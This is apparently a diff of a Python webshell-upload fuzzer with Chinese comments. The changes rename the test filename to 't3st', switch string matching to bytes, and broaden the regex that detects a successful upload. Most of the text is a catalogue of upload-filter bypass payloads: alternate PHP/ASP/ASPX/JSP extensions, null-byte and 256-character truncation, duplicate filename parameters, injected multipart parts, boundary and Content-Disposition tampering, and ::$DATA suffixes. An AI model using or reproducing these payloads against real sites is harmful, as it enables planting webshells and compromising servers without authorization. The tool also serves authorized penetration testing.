@@ -138,11 +138,11 @@ def get_work_file_info():
         # 用户没有提供`-r`参数
         file_suffix_list = ['jpg', 'png', 'gif', 'txt', 'xxx']
         for file_suffix in file_suffix_list:
-            filename = "test.%s" % file_suffix
+            filename = "t3st.%s" % file_suffix
             if file_suffix == 'jpg':
                 packet = origin_packet
                 packet = packet.replace(
-                    'filename="test.jpg"', 'filename="%s"' % filename)
+                    'filename="t3st.jpg"', 'filename="%s"' % filename)
                 packet = packet.replace(
                     "Content-Type: image/jpeg", "Content-Type: image/jpeg")
                 packet = packet.replace(jpg_file_content, jpg_file_content)
@@ -154,7 +154,7 @@ def get_work_file_info():
             elif file_suffix == 'png':
                 packet = origin_packet
                 packet = packet.replace(
-                    'filename="test.jpg"', 'filename="%s"' % filename)
+                    'filename="t3st.jpg"', 'filename="%s"' % filename)
                 packet = packet.replace(
                     'Content-Type: image/jpeg', 'Content-Type: image/png')
                 packet = packet.replace(jpg_file_content, png_file_content)
@@ -166,7 +166,7 @@ def get_work_file_info():
             elif file_suffix == 'gif':
                 packet = origin_packet
                 packet = packet.replace(
-                    'filename="test.jpg"', 'filename="%s"' % filename)
+                    'filename="t3st.jpg"', 'filename="%s"' % filename)
                 packet = packet.replace(
                     'Content-Type: image/jpeg', 'Content-Type: image/gif')
                 packet = packet.replace(jpg_file_content, gif_file_content)
@@ -178,7 +178,7 @@ def get_work_file_info():
             elif file_suffix == 'txt':
                 packet = origin_packet
                 packet = packet.replace(
-                    'filename="test.jpg"', 'filename="%s"' % filename)
+                    'filename="t3st.jpg"', 'filename="%s"' % filename)
                 packet = packet.replace(
                     'Content-Type: image/jpeg', 'Content-Type: text/plain')
                 packet = packet.replace(jpg_file_content, jpg_file_content)
@@ -190,7 +190,7 @@ def get_work_file_info():
             elif file_suffix == 'xxx':
                 packet = origin_packet
                 packet = packet.replace(
-                    'filename="test.jpg"', 'filename="%s"' % filename)
+                    'filename="t3st.jpg"', 'filename="%s"' % filename)
                 packet = packet.replace(
                     'Content-Type: image/jpeg', 'Content-Type: xxx/xxx')
                 packet = packet.replace(jpg_file_content, jpg_file_content)
@@ -206,7 +206,7 @@ def get_work_file_info():
         # 用户提供了`-r`参数来指定一个上传包文件
         file_suffix_list = ['jpg', 'png', 'gif', 'txt', 'xxx']
         for file_suffix in file_suffix_list:
-            filename = unicode_to_bytes("test.%s" % file_suffix)
+            filename = unicode_to_bytes("t3st.%s" % file_suffix)
             packet = packet_file_bytes
             file_content = re.search(
                 b'Content-Type: \S+\r\n\r\n([\s\S]+?)\r\n--%s' % boundary.encode('utf8'), packet, re.I).group(1)
@@ -224,9 +224,9 @@ def get_work_file_info():
                     return {'file_suffix': 'jpg', 'content_type': 'image/jpeg', 'file_content': jpg_file_content, 'work_packet': packet}
             elif file_suffix == 'png':
                 packet = packet.replace(
-                    'filename="test.jpg"', 'filename="%s"' % filename)
+                    b'filename="t3st.jpg"', b'filename="%s"' % filename)
                 packet = packet.replace(
-                    'Content-Type: image/jpeg', 'Content-Type: image/png')
+                    b'Content-Type: image/jpeg', b'Content-Type: image/png')
                 packet = packet.replace(
                     file_content, unicode_to_bytes(png_file_content))
                 rsp = post_multipart_form_data(packet)
@@ -236,9 +236,9 @@ def get_work_file_info():
                     return {'file_suffix': 'png', 'content_type': 'image/png', 'file_content': png_file_content, 'work_packet': packet}
             elif file_suffix == 'gif':
                 packet = packet.replace(
-                    'filename="test.jpg"', 'filename="%s"' % filename)
+                    b'filename="t3st.jpg"', b'filename="%s"' % filename)
                 packet = packet.replace(
-                    'Content-Type: image/jpeg', 'Content-Type: image/gif')
+                    b'Content-Type: image/jpeg', b'Content-Type: image/gif')
                 packet = packet.replace(
                     file_content, unicode_to_bytes(gif_file_content))
                 rsp = post_multipart_form_data(packet)
@@ -248,9 +248,9 @@ def get_work_file_info():
                     return {'file_suffix': 'gif', 'content_type': 'image/gif', 'file_content': gif_file_content, 'work_packet': packet}
             elif file_suffix == 'txt':
                 packet = packet.replace(
-                    'filename="test.jpg"', 'filename="%s"' % filename)
+                    b'filename="t3st.jpg"', b'filename="%s"' % filename)
                 packet = packet.replace(
-                    'Content-Type: image/jpeg', 'Content-Type: text/plain')
+                    b'Content-Type: image/jpeg', b'Content-Type: text/plain')
                 packet = packet.replace(
                     file_content, unicode_to_bytes(jpg_file_content))
                 rsp = post_multipart_form_data(packet)
@@ -260,9 +260,9 @@ def get_work_file_info():
                     return {'file_suffix': 'txt', 'content_type': 'text/plain', 'file_content': jpg_file_content, 'work_packet': packet}
             elif file_suffix == 'xxx':
                 packet = packet.replace(
-                    'filename="test.jpg"', 'filename="%s"' % filename)
+                    b'filename="t3st.jpg"', b'filename="%s"' % filename)
                 packet = packet.replace(
-                    'Content-Type: image/jpeg', 'Content-Type: xxx/xxx')
+                    b'Content-Type: image/jpeg', b'Content-Type: xxx/xxx')
                 packet = packet.replace(
                     file_content, unicode_to_bytes(jpg_file_content))
                 rsp = post_multipart_form_data(packet)
@@ -328,7 +328,7 @@ def check_upload_succeed(packet, rsp, origin_html, check='webshell'):
                         return True
             elif check == 'normal':
                 # 检测上传正常非webshell文件时成功上传的情况
-                if re.search(r"(succes)|(succeed)|(成功)", line, re.I):
+                if re.search(r"(succes)|(succeed)|(成功)|((/[^/]+){2,}\.\w+)", line, re.I):
                     return True
     return False
 
@@ -356,164 +356,164 @@ def fuzz_upload_webshell():
 
     fuzz_file_name = [
         {'desc': '修改后缀为webshell后缀',
-            'modify': {'filename': 'test.%s' % script_suffix}},
+            'modify': {'filename': 't3st.%s' % script_suffix}},
         {'desc': '修改后缀为非标准大小写webshell后缀',
-            'modify': {'filename': 'test.%s' % script_suffix.replace(script_suffix[1], script_suffix[1].upper())}},
-        {'desc': '上传如test..............(超长点).%s' % script_suffix,
-            'modify': {'filename': 'test%s%s' % ('.' * 1030, script_suffix)}},
-        {'desc': '上传文件名为如test.php......的文件',
-            'modify': {'filename': 'test.%s......' % script_suffix}},
-        {'desc': '上传test.%s;test.%s' % (work_suffix, script_suffix),
-            'modify': {'filename': 'test.%s;test.%s' % (work_suffix, script_suffix)}},
-        {'desc': '上传test.%s;test.%s' % (script_suffix, work_suffix),
-            'modify': {'filename': 'test.%s;test.%s' % (script_suffix, work_suffix)}},
-        {'desc': '上传test.%s.\n%s' % (work_suffix, script_suffix),
-            'modify': {'filename': 'test.%s.\n%s' % (work_suffix, script_suffix)}},
-        {'desc': '上传test.%s;%s.%s' % (script_suffix, '王' * 500, work_suffix),
-            'modify': {'filename': 'test.%s;%s.%s' % (script_suffix, '王' * 500, work_suffix)}},
-        {'desc': '上传test.%s' % script_suffix[:-1] + '\\r\\n' + script_suffix[-1],
-            'modify': {'filename': 'test.%s' % script_suffix[:-1] + '\x0d\x0a' + script_suffix[-1]}},
-        {'desc': '上传test.%s' % script_suffix[:-1] + '\\n' + script_suffix[-1],
-            'modify': {'filename': 'test.%s' % script_suffix[:-1] + '\x0a' + script_suffix[-1]}},
+            'modify': {'filename': 't3st.%s' % script_suffix.replace(script_suffix[1], script_suffix[1].upper())}},
+        {'desc': '上传如t3st..............(超长点).%s' % script_suffix,
+            'modify': {'filename': 't3st%s%s' % ('.' * 1030, script_suffix)}},
+        {'desc': '上传文件名为如t3st.php......的文件',
+            'modify': {'filename': 't3st.%s......' % script_suffix}},
+        {'desc': '上传t3st.%s;t3st.%s' % (work_suffix, script_suffix),
+            'modify': {'filename': 't3st.%s;t3st.%s' % (work_suffix, script_suffix)}},
+        {'desc': '上传t3st.%s;t3st.%s' % (script_suffix, work_suffix),
+            'modify': {'filename': 't3st.%s;t3st.%s' % (script_suffix, work_suffix)}},
+        {'desc': '上传t3st.%s.\n%s' % (work_suffix, script_suffix),
+            'modify': {'filename': 't3st.%s.\n%s' % (work_suffix, script_suffix)}},
+        {'desc': '上传t3st.%s;%s.%s' % (script_suffix, '王' * 500, work_suffix),
+            'modify': {'filename': 't3st.%s;%s.%s' % (script_suffix, '王' * 500, work_suffix)}},
+        {'desc': '上传t3st.%s' % script_suffix[:-1] + '\\r\\n' + script_suffix[-1],
+            'modify': {'filename': 't3st.%s' % script_suffix[:-1] + '\x0d\x0a' + script_suffix[-1]}},
+        {'desc': '上传t3st.%s' % script_suffix[:-1] + '\\n' + script_suffix[-1],
+            'modify': {'filename': 't3st.%s' % script_suffix[:-1] + '\x0a' + script_suffix[-1]}},
         {'desc': '上传%s.%s' % (script_suffix, script_suffix),
             'modify': {'filename': '%s.%s' % (script_suffix, script_suffix)}},
-        {'desc': '上传test.%s:test.%s' % (script_suffix, work_suffix),
-            'modify': {'filename': 'test.%s:test.%s' % (script_suffix, work_suffix)}},
-        {'desc': '上传test.%s<>' % script_suffix,
-            'modify': {'filename': 'test.%s<>' % script_suffix}},
-        {'desc': '上传test.%s.%s%s' % (script_suffix[0], script_suffix, script_suffix[1:]),
-            'modify': {'filename': 'test.%s.%s%s' % (script_suffix[0], script_suffix, script_suffix[1:])}},
+        {'desc': '上传t3st.%s:t3st.%s' % (script_suffix, work_suffix),
+            'modify': {'filename': 't3st.%s:t3st.%s' % (script_suffix, work_suffix)}},
+        {'desc': '上传t3st.%s<>' % script_suffix,
+            'modify': {'filename': 't3st.%s<>' % script_suffix}},
+        {'desc': '上传t3st.%s.%s%s' % (script_suffix[0], script_suffix, script_suffix[1:]),
+            'modify': {'filename': 't3st.%s.%s%s' % (script_suffix[0], script_suffix, script_suffix[1:])}},
         {'desc': '两个filename参数且前正常文件后webshell', 'modify': {
-            'filename': 'test.%s"; filename="test.%s' % (work_suffix, script_suffix)}},
+            'filename': 't3st.%s"; filename="t3st.%s' % (work_suffix, script_suffix)}},
         {'desc': '两个filename参数且前webshell后正常文件', 'modify': {
-            'filename': 'test.%s"; filename="test.%s' % (script_suffix, work_suffix)}},
-        {'desc': '上传test.%s.ddd,通过apache解析漏洞来执行webshell,上传成功后需要访问test.%s.ddd' % (script_suffix, script_suffix), 'modify': {
-            'filename': 'test.%s.ddd' % script_suffix}},
+            'filename': 't3st.%s"; filename="t3st.%s' % (script_suffix, work_suffix)}},
+        {'desc': '上传t3st.%s.ddd,通过apache解析漏洞来执行webshell,上传成功后需要访问t3st.%s.ddd' % (script_suffix, script_suffix), 'modify': {
+            'filename': 't3st.%s.ddd' % script_suffix}},
         # 双文件上传时,只修改file_name值的情况下可控的位置为两个文件的后缀与第一个文件的content-type,共4种情况
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改',
-            'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
+            'modify': {'filename': 't3st.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s' % (
                 work_suffix, work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix)}},
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type',
-            'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
+            'modify': {'filename': 't3st.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s' % (
                 work_suffix, webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix)}},
         {'desc': '双文件上传,前webshell后正常文件,且webshell的content-type未修改',
-            'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
+            'modify': {'filename': 't3st.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s' % (
                 script_suffix, webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, work_suffix)}},
         {'desc': '双文件上传,前webshell后正常文件,且webshell的content-type修改为正常文件的content-type',
-            'modify': {'filename': 'test.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s' % (
+            'modify': {'filename': 't3st.%s"\r\nContent-Type: %s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s' % (
                 script_suffix, work_content_type, work_file_content, '--' + boundary, form_file_param_name, work_suffix)}},
         {'desc': '上传后缀为如.php::$DATA的文件', 'modify': {
-            'filename': 'test.%s::$DATA' % script_suffix}},
+            'filename': 't3st.%s::$DATA' % script_suffix}},
         {'desc': '上传后缀为如.php::$DATA......的文件', 'modify': {
-            'filename': 'test.%s::$DATA......' % script_suffix}},
+            'filename': 't3st.%s::$DATA......' % script_suffix}},
 
     ]
     for i in range(0, 256):
         item = {'desc': '%00截断组,' + hex(i) + '截断', 'modify': {
-            'filename': 'test.%s%s.%s' % (script_suffix, chr(i), work_suffix)}}
+            'filename': 't3st.%s%s.%s' % (script_suffix, chr(i), work_suffix)}}
         fuzz_file_name.append(item)
         item = {'desc': '两个filename参数且前正常文件后webshell,且两个filename参数以' + hex(i) + '分割', 'modify': {
-            'filename': 'test.%s";%sfilename="test.%s' % (work_suffix, chr(i), script_suffix)}}
+            'filename': 't3st.%s";%sfilename="t3st.%s' % (work_suffix, chr(i), script_suffix)}}
         fuzz_file_name.append(item)
         item = {'desc': '两个filename参数且前webshell后正常文件,且两个filename参数以' + hex(i) + '分割', 'modify': {
-            'filename': 'test.%s";%sfilename="test.%s' % (script_suffix, chr(i), work_suffix)}}
+            'filename': 't3st.%s";%sfilename="t3st.%s' % (script_suffix, chr(i), work_suffix)}}
         fuzz_file_name.append(item)
     if script_suffix == "php":
         fuzz_file_name.append(
-            {'desc': '上传.php3,只适用于php', 'modify': {'filename': 'test.php3'}})
+            {'desc': '上传.php3,只适用于php', 'modify': {'filename': 't3st.php3'}})
         fuzz_file_name.append(
-            {'desc': '上传.php3,只适用于php', 'modify': {'filename': 'test.pHp3'}})
+            {'desc': '上传.php3,只适用于php', 'modify': {'filename': 't3st.pHp3'}})
         fuzz_file_name.append(
-            {'desc': '上传.php4,只适用于php', 'modify': {'filename': 'test.php4'}})
+            {'desc': '上传.php4,只适用于php', 'modify': {'filename': 't3st.php4'}})
         fuzz_file_name.append(
-            {'desc': '上传.php4,只适用于php', 'modify': {'filename': 'test.pHp4'}})
+            {'desc': '上传.php4,只适用于php', 'modify': {'filename': 't3st.pHp4'}})
         fuzz_file_name.append(
-            {'desc': '上传.php5,只适用于php', 'modify': {'filename': 'test.php5'}})
+            {'desc': '上传.php5,只适用于php', 'modify': {'filename': 't3st.php5'}})
         fuzz_file_name.append(
-            {'desc': '上传.php5,只适用于php', 'modify': {'filename': 'test.pHp5'}})
+            {'desc': '上传.php5,只适用于php', 'modify': {'filename': 't3st.pHp5'}})
         fuzz_file_name.append(
-            {'desc': '上传.phtm,只适用于php', 'modify': {'filename': 'test.phtm'}})
+            {'desc': '上传.phtm,只适用于php', 'modify': {'filename': 't3st.phtm'}})
         fuzz_file_name.append(
-            {'desc': '上传.pHtm,只适用于php', 'modify': {'filename': 'test.pHtm'}})
+            {'desc': '上传.pHtm,只适用于php', 'modify': {'filename': 't3st.pHtm'}})
         fuzz_file_name.append(
-            {'desc': '上传.phtml,只适用于php', 'modify': {'filename': 'test.phtml'}})
+            {'desc': '上传.phtml,只适用于php', 'modify': {'filename': 't3st.phtml'}})
         fuzz_file_name.append(
-            {'desc': '上传.phtml,只适用于php', 'modify': {'filename': 'test.pHtml'}})
+            {'desc': '上传.phtml,只适用于php', 'modify': {'filename': 't3st.pHtml'}})
         fuzz_file_name.append(
-            {'desc': '上传.pht,只适用于php', 'modify': {'filename': 'test.pht'}})
+            {'desc': '上传.pht,只适用于php', 'modify': {'filename': 't3st.pht'}})
         fuzz_file_name.append(
-            {'desc': '上传.pht,只适用于php', 'modify': {'filename': 'test.pHt'}})
+            {'desc': '上传.pht,只适用于php', 'modify': {'filename': 't3st.pHt'}})
         fuzz_file_name.append(
-            {'desc': '上传.phps,只适用于php', 'modify': {'filename': 'test.phps'}})
+            {'desc': '上传.phps,只适用于php', 'modify': {'filename': 't3st.phps'}})
         fuzz_file_name.append(
-            {'desc': '上传.phps,只适用于php', 'modify': {'filename': 'test.pHps'}})
+            {'desc': '上传.phps,只适用于php', 'modify': {'filename': 't3st.pHps'}})
         fuzz_file_name.append(
-            {'desc': '上传.php.pjpg,只适用于php', 'modify': {'filename': 'test.pjpg'}})
+            {'desc': '上传.php.pjpg,只适用于php', 'modify': {'filename': 't3st.pjpg'}})
         fuzz_file_name.append(
-            {'desc': '上传.php.pjpg,只适用于php', 'modify': {'filename': 'test.pJpg'}})
+            {'desc': '上传.php.pjpg,只适用于php', 'modify': {'filename': 't3st.pJpg'}})
         fuzz_file_name.append(
-            {'desc': '上传.html,只适用于php', 'modify': {'filename': 'test.html'}})
+            {'desc': '上传.html,只适用于php', 'modify': {'filename': 't3st.html'}})
         fuzz_file_name.append(
-            {'desc': '上传.html,只适用于php', 'modify': {'filename': 'test.hTml'}})
+            {'desc': '上传.html,只适用于php', 'modify': {'filename': 't3st.hTml'}})
         fuzz_file_name.append(
-            {'desc': '上传.inc,只适用于php', 'modify': {'filename': 'test.inc'}})
+            {'desc': '上传.inc,只适用于php', 'modify': {'filename': 't3st.inc'}})
         fuzz_file_name.append(
-            {'desc': '上传.inc,只适用于php', 'modify': {'filename': 'test.iNc'}})
+            {'desc': '上传.inc,只适用于php', 'modify': {'filename': 't3st.iNc'}})
         fuzz_file_name.append(
-            {'desc': '上传.lnk,只适用于php', 'modify': {'filename': 'test.lnk'}})
+            {'desc': '上传.lnk,只适用于php', 'modify': {'filename': 't3st.lnk'}})
         fuzz_file_name.append(
-            {'desc': '上传.lnk,只适用于php', 'modify': {'filename': 'test.lNk'}})
+            {'desc': '上传.lnk,只适用于php', 'modify': {'filename': 't3st.lNk'}})
     if script_suffix == 'asp':
         fuzz_file_name.append(
-            {'desc': '上传.asa文件,只适用于asp', 'modify': {'filename': 'test.asa'}})
+            {'desc': '上传.asa文件,只适用于asp', 'modify': {'filename': 't3st.asa'}})
         fuzz_file_name.append(
-            {'desc': '上传.aSa文件,只适用于asp', 'modify': {'filename': 'test.aSa'}})
-        fuzz_file_name.append({'desc': '上传.asa;test.%s文件,只适用于asp' % work_suffix, 'modify': {
-                              'filename': 'test.asa;test.%s' % work_suffix}})
-        fuzz_file_name.append({'desc': '上传.aSa;test.%s文件,只适用于asp' % work_suffix, 'modify': {
-                              'filename': 'test.aSa;test.%s' % work_suffix}})
+            {'desc': '上传.aSa文件,只适用于asp', 'modify': {'filename': 't3st.aSa'}})
+        fuzz_file_name.append({'desc': '上传.asa;t3st.%s文件,只适用于asp' % work_suffix, 'modify': {
+                              'filename': 't3st.asa;t3st.%s' % work_suffix}})
+        fuzz_file_name.append({'desc': '上传.aSa;t3st.%s文件,只适用于asp' % work_suffix, 'modify': {
+                              'filename': 't3st.aSa;t3st.%s' % work_suffix}})
         fuzz_file_name.append(
-            {'desc': '上传.cer文件,只适用于asp', 'modify': {'filename': 'test.cer'}})
+            {'desc': '上传.cer文件,只适用于asp', 'modify': {'filename': 't3st.cer'}})
         fuzz_file_name.append(
-            {'desc': '上传.cEr文件,只适用于asp', 'modify': {'filename': 'test.cEr'}})
-        fuzz_file_name.append({'desc': '上传.cer;test.%s文件,只适用于asp' % work_suffix, 'modify': {
-                              'filename': 'test.cer;test.%s' % work_suffix}})
-        fuzz_file_name.append({'desc': '上传.cEr;test.%s文件,只适用于asp' % work_suffix, 'modify': {
-                              'filename': 'test.cEr;test.%s' % work_suffix}})
+            {'desc': '上传.cEr文件,只适用于asp', 'modify': {'filename': 't3st.cEr'}})
+        fuzz_file_name.append({'desc': '上传.cer;t3st.%s文件,只适用于asp' % work_suffix, 'modify': {
+                              'filename': 't3st.cer;t3st.%s' % work_suffix}})
+        fuzz_file_name.append({'desc': '上传.cEr;t3st.%s文件,只适用于asp' % work_suffix, 'modify': {
+                              'filename': 't3st.cEr;t3st.%s' % work_suffix}})
         fuzz_file_name.append(
-            {'desc': '上传.cdx文件,只适用于asp', 'modify': {'filename': 'test.cdx'}})
+            {'desc': '上传.cdx文件,只适用于asp', 'modify': {'filename': 't3st.cdx'}})
         fuzz_file_name.append(
-            {'desc': '上传.cDx文件,只适用于asp', 'modify': {'filename': 'test.cDx'}})
-        fuzz_file_name.append({'desc': '上传.cdx;test.%s文件,只适用于asp' % work_suffix, 'modify': {
-                              'filename': 'test.cdx;test.%s' % work_suffix}})
-        fuzz_file_name.append({'desc': '上传.cDx;test.%s文件,只适用于asp' % work_suffix, 'modify': {
-                              'filename': 'test.cDx;test.%s' % work_suffix}})
+            {'desc': '上传.cDx文件,只适用于asp', 'modify': {'filename': 't3st.cDx'}})
+        fuzz_file_name.append({'desc': '上传.cdx;t3st.%s文件,只适用于asp' % work_suffix, 'modify': {
+                              'filename': 't3st.cdx;t3st.%s' % work_suffix}})
+        fuzz_file_name.append({'desc': '上传.cDx;t3st.%s文件,只适用于asp' % work_suffix, 'modify': {
+                              'filename': 't3st.cDx;t3st.%s' % work_suffix}})
     if script_suffix == 'aspx':
         fuzz_file_name.append({'desc': '上传.ashx文件,只适用于aspx', 'modify': {
-                              'filename': 'test.ashx'}})
+                              'filename': 't3st.ashx'}})
         fuzz_file_name.append({'desc': '上传.aShx文件,只适用于aspx', 'modify': {
-                              'filename': 'test.aShx'}})
+                              'filename': 't3st.aShx'}})
         fuzz_file_name.append({'desc': '上传.ascx文件,只适用于aspx', 'modify': {
-                              'filename': 'test.ascx'}})
+                              'filename': 't3st.ascx'}})
         fuzz_file_name.append({'desc': '上传.aScx文件,只适用于aspx', 'modify': {
-                              'filename': 'test.aScx'}})
+                              'filename': 't3st.aScx'}})
         fuzz_file_name.append({'desc': '上传.asax文件,只适用于aspx', 'modify': {
-                              'filename': 'test.asax'}})
+                              'filename': 't3st.asax'}})
         fuzz_file_name.append({'desc': '上传.aSax文件,只适用于aspx', 'modify': {
-                              'filename': 'test.aSax'}})
+                              'filename': 't3st.aSax'}})
         fuzz_file_name.append({'desc': '上传.asmx文件,只适用于aspx', 'modify': {
-                              'filename': 'test.asmx'}})
+                              'filename': 't3st.asmx'}})
         fuzz_file_name.append({'desc': '上传.aSmx文件,只适用于aspx', 'modify': {
-                              'filename': 'test.aSmx'}})
+                              'filename': 't3st.aSmx'}})
     if script_suffix == 'jsp':
         fuzz_file_name.append({'desc': '上传.jspx文件,只适用于jsp', 'modify': {
-                              'filename': 'test.jspx'}})
+                              'filename': 't3st.jspx'}})
         fuzz_file_name.append({'desc': '上传.jSpx文件,只适用于jsp', 'modify': {
-                              'filename': 'test.jSpx'}})
+                              'filename': 't3st.jSpx'}})
         fuzz_file_name.append({'desc': '上传.jspf文件,只适用于jsp', 'modify': {
-                              'filename': 'test.jspf'}})
+                              'filename': 't3st.jspf'}})
         fuzz_file_name.append({'desc': '上传.jSpf文件,只适用于jsp', 'modify': {
-                              'filename': 'test.jSpf'}})
+                              'filename': 't3st.jSpf'}})
 
     fuzz_content_type = [
         {'desc': '修改content-type为image/jpg',
@@ -530,19 +530,19 @@ def fuzz_upload_webshell():
             'modify': {'content_type': 'xxx/xxx'}},
         # 双文件上传时,只修改content-type值的情况下可控的位置为两个文件的content-type,共4种情况
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改,webshell的content-type未修改',
-            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
+            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s"\r\nContent-Type: %s' % (
                 work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, webshell_content_type)}},
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type未修改',
-            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
+            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s"\r\nContent-Type: %s' % (
                 webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, webshell_content_type)}},
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type未修改,webshell的content-type修改为正常文件的content-type',
-            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
+            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s"\r\nContent-Type: %s' % (
                 work_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
         {'desc': '双文件上传,前正常文件后webshell,且正常文件的content-type修改为webshell的content-type,webshell的content-type修改为正常文件的content-type',
-            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="test.%s"\r\nContent-Type: %s' % (
+            'modify': {'content_type': '%s\r\n\r\n%s\r\n%s\r\nContent-Disposition: form-data; name="%s"; filename="t3st.%s"\r\nContent-Type: %s' % (
                 webshell_content_type, work_file_content, '--' + boundary, form_file_param_name, script_suffix, work_content_type)}},
         {'desc': 'filename字段放在content-type后面', 'modify': {'content_type':
-                                                          work_content_type + '\r\nfilename="test.%s"' % script_suffix}}
+                                                          work_content_type + '\r\nfilename="t3st.%s"' % script_suffix}}
     ]
 
     for i in range(0, 256):
@@ -572,7 +572,7 @@ def fuzz_upload_webshell():
         # 修改content-type,file_content随着content-type而改变
         print(content_type_item['desc'])
         if not use_packet_file:
-            filename = "test.%s" % script_suffix
+            filename = "t3st.%s" % script_suffix
             packet = re.sub(
                 r'''(?<=filename=")[^\s;]+(?=")''', filename, work_packet)
             content_type = content_type_item['modify']['content_type']
@@ -592,7 +592,7 @@ def fuzz_upload_webshell():
             packet = re.sub(r"(?<=Content-Type: )\S+(?=\r\n)",
                             content_type, packet)
         else:
-            filename = "test.%s" % script_suffix
+            filename = "t3st.%s" % script_suffix
             packet = re.sub(
                 b'''(?<=filename=")[^\s;]+(?=")''', unicode_to_bytes(filename), work_packet)
             content_type = unicode_to_bytes(
@@ -646,25 +646,25 @@ def fuzz_upload_webshell():
             origin_line = 'Content-Type: multipart/form-data; boundary=%s' % boundary
             new_line = 'Content-Type: multipart/form-data; boundary=%s' % boundary_item['modify']['boundary']
             packet = work_packet.replace(origin_line, new_line)
-            packet = packet.replace('filename="test.jpg"',
-                                    'filename="test.%s"' % script_suffix)
+            packet = packet.replace('filename="t3st.jpg"',
+                                    'filename="t3st.%s"' % script_suffix)
         else:
             origin_line = b'Content-Type: multipart/form-data; boundary=%s' % boundary
             new_line = b'Content-Type: multipart/form-data; boundary=%s' % boundary_item['modify']['boundary']
             packet = work_packet.replace(origin_line, new_line)
             packet = packet.replace(
-                b'filename="test.jpg"', b'filename="test.%s"' % unicode_to_bytes(script_suffix))
+                b'filename="t3st.jpg"', b'filename="t3st.%s"' % unicode_to_bytes(script_suffix))
         rsp = post_multipart_form_data(packet)
         check_upload_succeed(packet, rsp, origin_html)
 
     # 修改Content-Disposition中的name字段值使filename字段前有超长内容,并修改后缀为webshell后缀
-    name_item = {'desc': '修改Content-Disposition中的name字段的值,在name后面加超长字符,如Content-Disposition: form-data; name="uploaded"dddddd(超长d)dddd; filename="test.php"', 'modify': {
-        'name': 'Content-Disposition: form-data; name="%s"%s; filename="test.%s"' % (form_file_param_name, 'd' * 2000, script_suffix)}}
+    name_item = {'desc': '修改Content-Disposition中的name字段的值,在name后面加超长字符,如Content-Disposition: form-data; name="uploaded"dddddd(超长d)dddd; filename="t3st.php"', 'modify': {
+        'name': 'Content-Disposition: form-data; name="%s"%s; filename="t3st.%s"' % (form_file_param_name, 'd' * 2000, script_suffix)}}
     if not use_packet_file:
-        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
         packet = work_packet.replace(origin_line, name_item['modify']['name'])
     else:
-        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
         packet = work_packet.replace(
             origin_line, unicode_to_bytes(name_item['modify']['name']))
     print(name_item['desc'])
@@ -673,12 +673,12 @@ def fuzz_upload_webshell():
 
     # 修改Content-Disposition中的name部分形如name=\n"file",并修改后缀为webshell后缀
     name_item = {'desc': '修改Content-Disposition中的name部分形如name=\n"%s",并修改后缀为webshell后缀' % (form_file_param_name, script_suffix), 'modify': {
-        'name': 'Content-Disposition: form-data; name=\n"%s"; filename="test.%s"' % (form_file_param_name, script_suffix)}}
+        'name': 'Content-Disposition: form-data; name=\n"%s"; filename="t3st.%s"' % (form_file_param_name, script_suffix)}}
     if not use_packet_file:
-        origin_line = 'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        origin_line = 'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
         packet = work_packet.replace(origin_line, name_item['modify']['name'])
     else:
-        origin_line = b'Content-Disposition: form-data; name="%s"; filename="test.jpg"' % form_file_param_name
+        origin_line = b'Content-Disposition: form-data; name="%s"; filename="t3st.jpg"' % form_file_param_name
         packet = work_packet.replace(
             origin_line, unicode_to_bytes(name_item['modify']['name']))
     print(name_item['desc'])
@@ -687,13 +687,13 @@ def fuzz_upload_webshell():
 
